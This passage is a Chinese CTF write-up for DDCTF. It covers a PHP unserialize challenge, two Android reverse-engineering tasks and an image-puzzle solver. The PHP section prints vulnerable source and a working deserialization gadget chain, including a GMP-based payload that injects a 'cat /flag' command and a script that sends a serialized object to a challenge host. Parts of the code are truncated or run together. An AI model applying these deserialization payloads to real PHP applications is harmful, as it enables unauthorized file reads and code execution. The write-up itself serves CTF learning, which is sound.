            unset($this->page->cont);
        }
    }
    class MiddleMan
    {
        private $cont;
        public $content;
        public function __construct()
        {
            $this->content = array();
        }
        public function __unset($key)
        {
            $func = $this->content;
            return $func();
        }
    }
    class Info
    {
        function __construct()
        {
            eval('phpinfo();');
        }
    }
    $show = new ShowOff();
    $bullet = $_GET['bullet'];
    if(!isset($bullet))
    {
        highlight_file(__FILE__);
        die("Give Me Something!");
    }else if($bullet == 'phpinfo')
    {
        $infos = new Info();
    }else
    {
        $obstacle1 = new stdClass;
        $obstacle2 = new stdClass;
        $mc = new MyClass();
        $mc->flag = "MyClass's flag said, Overwrite Me If You Can!";
        @unserialize($bullet);
        echo $mc->get_flag();
    }
    Give Me Something!
看到特意设置 `$this->kw0ng = 2;`，就能猜到是考 GMP 了。可参考
[https://paper.seebug.org/1267/。](https://paper.seebug.org/1267/%E3%80%82)
线上 include 一直读不到内容，放弃了。没想到 http://117.51.137.166/hint/hint.php 直接能访问……
    Good Job! You've got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i'll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!
GMP做法：
    $inner = 's:1:"4";a:2:{s:4:"flag";s:20:"-exec cat /flag {} ;";i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}';
    $exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
不过这题不用 GMP 也能打。
    flag = '-exec cat /flag {} ;';
    $showoff->page = new MiddleMan();
    $showoff->page->content = [$myclass, 'get_flag'];
    $paylod = urlencode(serialize($showoff));
    $url = 'http://117.51.137.166/atkPWsr2x3omRZFi.php?bullet=';
    echo file_get_contents($url . $paylod);
## Android reverse1
题目后来改成只需要输入 md5 结果就可以了，略。
## Android reverse2
基本是 re1 加了壳和 ollvm。
输入flag，进行 AES（key 是 `1234567890123456`），再进行一个类似 TEA 的块加密（12轮，key 是
`[20,20,30,40]`)。
块加密只要把加密流程倒过来就是解密，块加密部分代码如下：
    #include 
    void encrypt()
    {
        int ct[8] = {0xA1D4547,0x46F12E5A,0xFA679C2B,0xA90F985,0x4898B5D8,0x940C67C7,0xD2549BB2,0x7A2E9E37};
        unsigned int b0,b1,b2,b3,b4,b5,b6,b7;
        int k0,k1,k2,k3;
        int key[4] = {20,20,30,40};
        int round;
        unsigned int sum;
        b0 = ct[0];
        b1 = ct[1];
        b4 = ct[4];
        b5 = ct[5];
        b6 = ct[6];
        b7 = ct[7];
        b2 = ct[2];
        b3 = ct[3];
        round = -12;
        sum = 0x9E3779B9;
        int v15;
        do
        {
            v15 = (sum >> 2) & 3;
            k0 = key[v15];
            b0 += (((4 * b1) ^ (b7 >> 5)) + ((b1 >> 3) ^ (16 * b7))) ^ ((k0 ^ b7) + (b1 ^ sum));
            k1 = key[v15 ^ 1];
            b1 += (((4 * b2) ^ (b0 >> 5)) + ((b2 >> 3) ^ (16 * b0))) ^ ((k1 ^ b0) + (b2 ^ sum));
            k2 = key[v15 ^ 2];
            k3 = key[v15 ^ 3];
            b2 += (((4 * b3) ^ (b1 >> 5)) + ((b3 >> 3) ^ (16 * b1))) ^ ((k2 ^ b1) + (b3 ^ sum));
            b3 += (((4 * b4) ^ (b2 >> 5)) + ((b4 >> 3) ^ (16 * b2))) ^ ((k3 ^ b2) + (b4 ^ sum));
            b4 += (((4 * b5) ^ (b3 >> 5)) + ((b5 >> 3) ^ (16 * b3))) ^ ((k0 ^ b3) + (b5 ^ sum));
            b5 += (((4 * b6) ^ (b4 >> 5)) + ((b6 >> 3) ^ (16 * b4))) ^ ((k1 ^ b4) + (b6 ^ sum));
            b6 += (((4 * b7) ^ (b5 >> 5)) + ((b7 >> 3) ^ (16 * b5))) ^ ((k2 ^ b5) + (b7 ^ sum));
            b7 += (((4 * b0) ^ (b6 >> 5)) + ((b0 >> 3) ^ (16 * b6))) ^ ((k3 ^ b6) + (b0 ^ sum));
            sum -= 0x61C88647;
            if(b0 == 0x236CF790) {
                printf("%d!!\n",round);
            }
            round++;
        } while (round);
        ct[4] = b4;
        ct[5] = b5;
        ct[6] = b6;
        ct[7] = b7;
        ct[0] = b0;
        ct[1] = b1;
        ct[2] = b2;
        ct[3] = b3;
        for(int i=0;i> 2) & 3;
            k0 = key[v15];
            k1 = key[v15 ^ 1];
            k2 = key[v15 ^ 2];
            k3 = key[v15 ^ 3];
            b7 -= (((4 * b0) ^ (b6 >> 5)) + ((b0 >> 3) ^ (16 * b6))) ^ ((k3 ^ b6) + (b0 ^ sum));
            b6 -= (((4 * b7) ^ (b5 >> 5)) + ((b7 >> 3) ^ (16 * b5))) ^ ((k2 ^ b5) + (b7 ^ sum));
            b5 -= (((4 * b6) ^ (b4 >> 5)) + ((b6 >> 3) ^ (16 * b4))) ^ ((k1 ^ b4) + (b6 ^ sum));
            b4 -= (((4 * b5) ^ (b3 >> 5)) + ((b5 >> 3) ^ (16 * b3))) ^ ((k0 ^ b3) + (b5 ^ sum));
            b3 -= (((4 * b4) ^ (b2 >> 5)) + ((b4 >> 3) ^ (16 * b2))) ^ ((k3 ^ b2) + (b4 ^ sum));
            b2 -= (((4 * b3) ^ (b1 >> 5)) + ((b3 >> 3) ^ (16 * b1))) ^ ((k2 ^ b1) + (b3 ^ sum));
            b1 -= (((4 * b2) ^ (b0 >> 5)) + ((b2 >> 3) ^ (16 * b0))) ^ ((k1 ^ b0) + (b2 ^ sum));
            b0 -= (((4 * b1) ^ (b7 >> 5)) + ((b1 >> 3) ^ (16 * b7))) ^ ((k0 ^ b7) + (b1 ^ sum));
            round++;
            sum += 0x61C88647;
        } while (round);
        ct[4] = b4;
        ct[5] = b5;
        ct[6] = b6;
        ct[7] = b7;
        ct[0] = b0;
        ct[1] = b1;
        ct[2] = b2;
        ct[3] = b3;
        for(int i=0;i<8;i++){
            printf("0x%x,", ct[i]);
        }
    }
    int main()
    {
        decrypt();
    }
输出是：
    0x7ac10c4d,0x8db932c0,0x3bcb75a,0x796cdcac,0x9ddefec9,0x6f901a2c,0x575f7ae5,0x56c3ba58
把这个用 AES 解密就可以得到 flag。
## 拼图
把原图切成 51 * 27 的 6400 个小图，依次和给定的图片匹配，这样可以匹配 6378 张图片，还剩22张，得到：
剩下的 22 张图片手动拼接，得到：
**exp**
    from PIL import Image
    import os
    import json
    import shutil
    SINGLE_X = 51
    SINGLE_Y = 27
    def get_one_block(pic, lx, ly):
        new_pic = Image.new("RGB",(SINGLE_X, SINGLE_Y))
        for i in range(lx, lx + SINGLE_X):
            for j in range(ly, ly+SINGLE_Y):
                try:
                    pix = pic.getpixel((i,j))
                    new_pic.putpixel((i-lx,j-ly), pix)
                except IndexError:
                    print(lx, ly, j, i)
        return new_pic
    def put_one_block(pic, lx, ly, new_pic):
        for i in range(lx, lx + SINGLE_X):
            for j in range(ly, ly+SINGLE_Y):
                try:
                    pix = new_pic.getpixel((i-lx,j-ly))
                    pic.putpixel((i,j), pix)
                except IndexError:
                    print(lx, ly, j, i)
    split_names = os.listdir("./new_pic/")
    split_names = [i for i in split_names if "png" in i]
    origin_names = os.listdir("./file_d0wnl0ad/")
    origin_names = [i for i in origin_names if "png" in i]
    def get_pic_datas(pattern, names):
        pic_data = []
        for i in names:
            im = Image.open(pattern.format(i))
            pic_data.append(list(im.getdata()))
            im.close()
        return pic_data
    def get_pairs():
        origin_datas = get_pic_datas("./file_d0wnl0ad/{}", origin_names)
        split_datas = get_pic_datas("./new_pic/{}", split_names)
        pairs = dict()
        PIX_NUMBER = 5 
        new_one = 0
        for i in split_datas:
            pair = [j for j in origin_datas if j == i]
            if len(pair) == 1:
                split_n = split_names[split_datas.index(i)]
                origin_n = origin_names[origin_datas.index(pair[0])]
                pairs[split_n] = origin_n
            else:
                pair = [j for j in origin_datas if j[-PIX_NUMBER:] == i[-PIX_NUMBER:]]
                if len(pair) == 1:
                    new_one += 1
                    split_n = split_names[split_datas.index(i)]
                    origin_n = origin_names[origin_datas.index(pair[0])]
                    pairs[split_n] = origin_n
                else:
                    print(len(pair))
        print(new_one)
        return pairs
    def combine_pic(pairs):
        new_demo = Image.new("RGB", (4096,2160))
        for split_n,origin_n in pairs.items():
            li, lj = split_n.split('.')[0].split('_')
            li, lj = int(li), int(lj)
            new_pic = Image.open("./file_d0wnl0ad/{}".format(origin_n))
            put_one_block(new_demo, li * SINGLE_X, lj * SINGLE_Y, new_pic)
            new_pic.close()
        return new_demo
    if __name__ == "__main__":
        demo = Image.open("./file_d0wnl0ad/demo.jpg")
        # im = get_one_block(demo, 0,0)
        # im.show()
        # for i in range(0, 80):
        #     for j in range(0, 80):
        #         im = get_one_block(demo, i * SINGLE_X, j * SINGLE_Y)
        #         im.save("new_pic/{}_{}.png".format(i,j))
        pairs = get_pairs()     print(len(pairs))
        with open("pairs.json", "w") as f:
            json.dump(pairs, f)
        with open("pairs.json", "r") as f:
            pairs = json.load(f)
        # left = [i for i in origin_names if i not in pairs.values()]
        # print(len(left))
        # for i in left:
        #     shutil.copyfile("./file_d0wnl0ad/{}".format(i), "./left_pic/{}".format(i))
        # print(left)
        # new_demo = combine_pic(pairs)
        # new_demo.show()
        # new_demo.save("new_demo.png")